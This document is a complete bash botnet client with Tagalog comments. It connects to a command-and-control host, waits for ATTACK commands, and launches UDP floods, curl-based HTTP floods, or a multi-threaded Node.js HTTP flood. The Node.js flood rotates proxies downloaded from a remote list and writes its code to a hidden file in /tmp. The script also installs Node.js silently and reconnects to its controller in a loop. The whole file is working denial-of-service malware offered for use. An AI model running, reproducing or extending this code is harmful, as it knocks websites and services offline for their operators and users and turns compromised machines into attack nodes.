#!/bin/bash
# ==================== ADVANCED BASH BOT CLIENT WITH JS DDoS ====================
# Usage: bash bot.sh <C2_HOST> <C2_PORT>
# 
# Command format from C2 for JS method:
#   ATTACK <url> 0 <duration_seconds> <threads> js <rps> [proxies_file_or_url]
#
# Kung walang proxies_file_or_url, gagamitin ang DEFAULT_PROXY_URL.
# Kung ang proxies_file_or_url ay nagsisimula sa "http", ito ay ida-download muna.
# Kung hindi, ituturing na local file path.
#
# Example:
#   ATTACK http://target.com 0 60 10 js 1000
#   ATTACK http://target.com 0 60 10 js 1000 /tmp/proxies.txt
#   ATTACK http://target.com 0 60 10 js 1000 https://raw.githubusercontent.com/Dagankol/Hex/refs/heads/main/px.txt
#
# Features:
# - Multi-threaded using Node.js worker_threads
# - Proxy rotation mula sa na-download o lokal na file
# - Supports HTTP and HTTPS
# - Precise RPS throttling per thread
# - Automatic stop after duration
# - No external dependencies except Node.js

C2_HOST="$1"
C2_PORT="${2:-4444}"

STOP_FLAG=0
DEFAULT_PROXY_URL="https://raw.githubusercontent.com/Dagankol/Hex/refs/heads/main/px.txt"

# ---- Install Node.js if missing ----
install_nodejs() {
    if command -v node >/dev/null 2>&1; then
        return 0
    fi
    echo "[Bot] Installing Node.js..."
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -qq && apt-get install -y -qq nodejs >/dev/null 2>&1
    elif command -v yum >/dev/null 2>&1; then
        yum install -y -q nodejs >/dev/null 2>&1
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y -q nodejs >/dev/null 2>&1
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm nodejs >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk add nodejs >/dev/null 2>&1
    elif command -v pkg >/dev/null 2>&1; then
        pkg install -y nodejs >/dev/null 2>&1
    elif command -v brew >/dev/null 2>&1; then
        brew install node >/dev/null 2>&1
    else
        echo "[Bot] No package manager to install Node.js"
        return 1
    fi
    command -v node >/dev/null 2>&1
}

# ---- Download proxies from URL to local temp file ----
download_proxies() {
    local url="$1"
    local output_file="/tmp/.proxies_$$.txt"
    if command -v curl >/dev/null 2>&1; then
        curl -s -o "$output_file" "$url"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$output_file" "$url"
    else
        echo "[Bot] No downloader found"
        return 1
    fi
    if [ -s "$output_file" ]; then
        echo "$output_file"
        return 0
    else
        rm -f "$output_file"
        return 1
    fi
}

# ---- Write the advanced JS flood script to /tmp/.js_flood.js ----
write_js_flood_script() {
    cat > /tmp/.js_flood.js <<'JSEOF'
// ==================== DITO MO ILAGAY ANG IYONG BUONG JS DDoS CODE (SIMULA) ====================
// I-paste mo ang iyong buong JavaScript code sa pagitan ng mga marker na ito.
// Siguraduhin na gagamitin mo ang mga argumentong ipinapasa mula sa command line:
//   process.argv[2] = URL
//   process.argv[3] = duration (seconds)
//   process.argv[4] = threads (total number of threads/workers)
//   process.argv[5] = rps (total requests per second)
//   process.argv[6] = proxies file path
// Maaari mong gamitin ang mga ito sa iyong code ayon sa iyong lohika.
// ---------------------------------------------------------------------------

// ==================== HALIMBAWA NG EXISTING CODE (Maaari mong palitan) ====================
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

if (isMainThread) {
    // Main thread: spawn worker threads and manage them
    const urlStr = process.argv[2];
    const durationSec = parseInt(process.argv[3]);
    const totalThreads = parseInt(process.argv[4]);
    const totalRps = parseInt(process.argv[5]);
    const proxiesFile = process.argv[6];

    // Load proxies into memory and pass them to workers
    let proxies = [];
    try {
        const data = fs.readFileSync(proxiesFile, 'utf8');
        proxies = data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    } catch (e) {
        console.error('Proxy file not found or unreadable, continuing without proxies');
    }

    // Distribute RPS among threads
    const rpsPerThread = Math.ceil(totalRps / totalThreads);
    const workers = [];
    let completedWorkers = 0;

    console.log(`[JS] Starting attack: ${urlStr} | Duration: ${durationSec}s | Threads: ${totalThreads} | Total RPS: ${totalRps} | Proxies: ${proxies.length}`);

    for (let i = 0; i < totalThreads; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                url: urlStr,
                durationSec,
                rpsPerThread,
                proxies,
                threadId: i
            }
        });
        worker.on('exit', () => {
            completedWorkers++;
            if (completedWorkers === totalThreads) {
                // All workers done, exit main process
                process.exit(0);
            }
        });
        worker.on('error', (err) => {
            console.error(`Worker ${i} error: ${err.message}`);
        });
        workers.push(worker);
    }

    // Safety timeout in case workers hang
    setTimeout(() => {
        console.log('[JS] Force exit after duration + 2s');
        process.exit(0);
    }, durationSec * 1000 + 2000);
} else {
    // Worker thread code
    const { url: urlStr, durationSec, rpsPerThread, proxies, threadId } = workerData;
    const endTime = Date.now() + durationSec * 1000;

    // Parse URL
    let parsedUrl;
    try {
        parsedUrl = new URL(urlStr);
    } catch (e) {
        console.error(`[Worker ${threadId}] Invalid URL: ${urlStr}`);
        process.exit(1);
    }

    const isHttps = parsedUrl.protocol === 'https:';
    const hostname = parsedUrl.hostname;
    const port = parsedUrl.port || (isHttps ? 443 : 80);
    const path = parsedUrl.pathname + parsedUrl.search;

    // Function to send a single request using a proxy if available
    function sendRequest() {
        const options = {
            hostname: hostname,
            port: port,
            path: path,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
        };

        // If proxies available, rotate through them
        if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const [proxyHost, proxyPortStr] = proxy.split(':');
            const proxyPort = parseInt(proxyPortStr);
            if (!proxyHost || !proxyPort) {
                // invalid proxy, skip
                return;
            }
            // Use proxy: request the full URL through proxy
            options.hostname = proxyHost;
            options.port = proxyPort;
            options.path = urlStr; // absolute URL
            options.headers['Host'] = hostname;
        }

        const mod = isHttps ? https : http;
        const req = mod.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });
        req.on('error', () => {});
        req.setTimeout(5000, () => req.destroy());
        req.end();
    }

    // Throttle requests to achieve desired RPS per thread
    const intervalMs = 1000 / rpsPerThread;
    let requestCount = 0;
    const intervalId = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(intervalId);
            process.exit(0);
        }
        sendRequest();
        requestCount++;
    }, intervalMs);

    // Prevent event loop from exiting prematurely
    setTimeout(() => {}, endTime - Date.now() + 1000);
}
// ==================== DITO MO ILAGAY ANG IYONG BUONG JS DDoS CODE (WAKAS) ====================
JSEOF
    chmod +x /tmp/.js_flood.js 2>/dev/null
}

# ---- UDP flood attack ----
udp_flood() {
    local target_ip=$1
    local port=$2
    local duration=$3
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && [ $STOP_FLAG -eq 0 ]; do
        head -c 1024 /dev/urandom > /dev/udp/$target_ip/$port 2>/dev/null
    done
}

# ---- HTTP flood attack (using curl) ----
http_flood() {
    local target_ip=$1
    local port=$2
    local duration=$3
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ] && [ $STOP_FLAG -eq 0 ]; do
        curl -s -o /dev/null http://$target_ip:$port/ &
        sleep 0.01
    done
    wait
}

# ---- JS flood attack (uses Node.js, single master process with internal workers) ----
js_flood() {
    local url=$1
    local duration=$2
    local threads=$3
    local rps=$4
    local proxies_arg=$5  # could be file path or URL or empty

    # Resolve proxies source
    local proxies_file=""
    if [ -z "$proxies_arg" ]; then
        # Use default URL
        echo "[Bot] No proxies specified, downloading from default URL..."
        proxies_file=$(download_proxies "$DEFAULT_PROXY_URL")
        if [ $? -ne 0 ]; then
            echo "[Bot] Failed to download proxies, continuing without proxies"
            proxies_file=""
        fi
    elif [[ "$proxies_arg" == http* ]]; then
        echo "[Bot] Downloading proxies from URL: $proxies_arg"
        proxies_file=$(download_proxies "$proxies_arg")
        if [ $? -ne 0 ]; then
            echo "[Bot] Failed to download proxies, continuing without proxies"
            proxies_file=""
        fi
    else
        # Assume local file path
        if [ -f "$proxies_arg" ]; then
            proxies_file="$proxies_arg"
        else
            echo "[Bot] Proxies file not found: $proxies_arg, continuing without proxies"
            proxies_file=""
        fi
    fi

    # Ensure JS script exists
    if [ ! -f /tmp/.js_flood.js ]; then
        write_js_flood_script
    fi

    # If no proxies file, pass empty string so JS handles no proxies
    if [ -z "$proxies_file" ]; then
        proxies_file="/dev/null"  # placeholder, JS will catch error and proceed without
    fi

    # Launch a single Node.js master process which spawns internal workers
    node /tmp/.js_flood.js "$url" "$duration" "$threads" "$rps" "$proxies_file" &

    # Cleanup downloaded temp file after a delay (allow JS to read it)
    if [[ "$proxies_arg" == http* ]] || [ -z "$proxies_arg" ]; then
        (
            sleep 5
            rm -f "$proxies_file" 2>/dev/null
        ) &
    fi
}

# ---- Main loop: connect to C2, handle commands, reconnect ----
while true; do
    exec 3<>/dev/tcp/$C2_HOST/$C2_PORT 2>/dev/null
    if [ $? -ne 0 ]; then
        sleep 5
        continue
    fi
    echo "[Bot] Connected to C2 at $C2_HOST:$C2_PORT"

    while read -r cmd <&3; do
        cmd=$(echo "$cmd" | tr -d '\r\n')
        [ -z "$cmd" ] && continue

        if [ "$cmd" == "STOP" ]; then
            STOP_FLAG=1
            pkill -f "udp_flood|http_flood|js_flood.js" 2>/dev/null
            STOP_FLAG=0
            echo "[Bot] Attack stopped"
        elif [[ "$cmd" == ATTACK* ]]; then
            # Parse: ATTACK <target> <port> <duration> <threads> <method> [extra args...]
            set -- $cmd
            shift  # remove "ATTACK"
            target=$1
            port=$2
            duration=$3
            threads=$4
            method=$5

            echo "[Bot] Starting $method attack on $target:$port for $duration seconds with $threads threads"

            case "$method" in
                udp)
                    for ((i=0; i<threads; i++)); do
                        udp_flood $target $port $duration &
                    done
                    ;;
                http)
                    for ((i=0; i<threads; i++)); do
                        http_flood $target $port $duration &
                    done
                    ;;
                js)
                    # JS method: target is a full URL, port is ignored.
                    # Extra args: rps (arg6), proxies_file/url (arg7)
                    rps=$6
                    proxies_spec=$7
                    if [ -z "$rps" ]; then
                        echo "[Bot] JS method requires RPS: ATTACK <url> 0 <time> <threads> js <rps> [proxies_file_or_url]"
                    else
                        if ! install_nodejs; then
                            echo "[Bot] Node.js not available, cannot run JS method"
                        else
                            write_js_flood_script
                            js_flood "$target" "$duration" "$threads" "$rps" "$proxies_spec"
                        fi
                    fi
                    ;;
                *)
                    # Default UDP
                    for ((i=0; i<threads; i++)); do
                        udp_flood $target $port $duration &
                    done
                    ;;
            esac

            # Schedule automatic stop after duration (for non-JS methods; JS self-stops)
            if [ "$method" != "js" ]; then
                (
                    sleep $duration
                    STOP_FLAG=1
                    pkill -f "udp_flood|http_flood|js_flood.js" 2>/dev/null
                    STOP_FLAG=0
                ) &
            fi
        fi
    done

    exec 3<&-
    exec 3>&-
    echo "[Bot] Connection lost. Reconnecting in 3 seconds..."
    sleep 3
done
